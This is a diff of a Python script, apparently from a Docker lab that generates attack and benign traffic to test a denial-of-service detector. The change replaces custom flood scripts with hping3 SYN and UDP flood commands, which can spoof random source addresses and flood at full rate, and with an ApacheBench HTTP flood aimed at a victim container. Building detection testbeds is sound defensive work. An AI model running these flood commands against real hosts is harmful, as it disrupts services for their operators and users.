@@ -35,29 +35,29 @@ ALL_CONTAINERS = [DETECTOR, "victim"] + ATTACKERS + [BENIGN_FLOOR]
 
 # ===== bo lenh tan cong/benign (phan SAU 'docker exec <ct> timeout <dur>') =====
 def c_syn(pps=None, spoof=False):
-    a = ["python3", "/app/syn_flood.py", VICTIM, "-p", "80"]
+    a = ["hping3", "-S", "-p", "80", "-q"]
     if spoof:
-        a.append("--spoof")
-    if pps is not None:
-        a += ["--pps", str(pps)]
+        a.append("--rand-source")
+    if pps is not None and pps > 0:
+        a += ["-i", "u%d" % (1000000 // pps)]
+    else:
+        a.append("--flood")
+    a.append(VICTIM)
     return a
 
 def c_udp(pps=None, spoof=False):
-    a = ["python3", "/app/udp_flood.py", VICTIM, "-p", "80"]
+    a = ["hping3", "--udp", "-p", "80", "-q"]
     if spoof:
-        a.append("--spoof")
-    if pps is not None:
-        a += ["--pps", str(pps)]
+        a.append("--rand-source")
+    if pps is not None and pps > 0:
+        a += ["-i", "u%d" % (1000000 // pps)]
+    else:
+        a.append("--flood")
+    a.append(VICTIM)
     return a
 
 def c_http(threads, dur, pps=0):
-    # http_flood tu dung sau -d giay; timeout boc ngoai la lop an toan.
-    # pps>0: gioi han REQUEST/giay -> pps goi ve dai THUC TE (tranh chuc nghin pps phi thuc te cua
-    # bridge Docker; quan trong de khop mien voi demo 2 may WiFi).
-    a = ["python3", "/app/http_flood.py", VICTIM, "-p", "80", "-t", str(threads), "-d", str(dur)]
-    if pps:
-        a += ["--pps", str(pps)]
-    return a
+    return ["ab", "-k", "-c", str(threads), "-t", str(dur), "-n", "10000000", "http://%s/" % VICTIM]
 
 def c_benign(pps, dur):
     return ["python3", "/app/benign_gen.py", VICTIM, "--pps", str(pps), "-d", str(dur)]
